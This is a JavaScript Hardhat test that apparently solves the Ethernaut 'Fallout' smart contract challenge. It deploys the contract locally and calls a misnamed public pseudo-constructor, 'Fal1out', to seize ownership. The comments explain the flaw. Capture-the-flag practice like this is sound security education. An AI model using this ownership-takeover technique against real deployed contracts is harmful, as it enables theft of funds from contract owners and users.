const { expect } = require("chai");

describe("Fallout", function () {

    let Fallout;
    let fallout;


    before(async function () {
        const [owner, otherAccount] = await ethers.getSigners();

        Fallout = await ethers.getContractFactory("Fallout");
        fallout = await Fallout.deploy();
    })

    it("will take ownership", async function() {
        const [owner, otherAccount] = await ethers.getSigners();

        console.log(await ethers.provider.getBalance(owner.address))

        console.log(await fallout.owner())

        // misnamed function disqualifies as legacy constructor
        // public function free to call and write to
        await fallout.connect(owner).Fal1out({
            "value":ethers.utils.parseEther("0.0001")
        })
        console.log(await fallout.owner())      

        console.log(await ethers.provider.getBalance(owner.address))
    })

})